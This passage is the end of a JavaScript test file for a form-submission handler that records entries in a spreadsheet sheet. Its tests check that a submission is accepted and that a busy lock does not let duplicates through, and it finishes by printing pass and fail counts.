  const out = post(h.api, { 'form-name': 'roundtable', submissionId: 'cos1',
                            firstName: 'Ann', email: 'a@x.com' });
  eq(out.ok, true);
  eq(rowsOf(h.sheets['Roundtable']).length, 1);
});

check('a busy lock does not bypass the duplicate check', () => {
  const h = harness({ lockBusy: true });
  const f = { 'form-name': 'roundtable', submissionId: 'lock1', firstName: 'Ann', email: 'a@x.com' };
  post(h.api, f);
  post(h.api, f);
  eq(rowsOf(h.sheets['Roundtable']).length, 1, 'the sheet, not the lock, is what prevents duplicates');
});

// ---------------------------------------------------------------------------

console.log('');
console.log(passed + ' passed, ' + failed + ' failed');
if (failures.length) {
  console.log('');
  failures.forEach((f, i) => console.log('  ' + (i + 1) + ')  ' + f));
  process.exit(1);
}
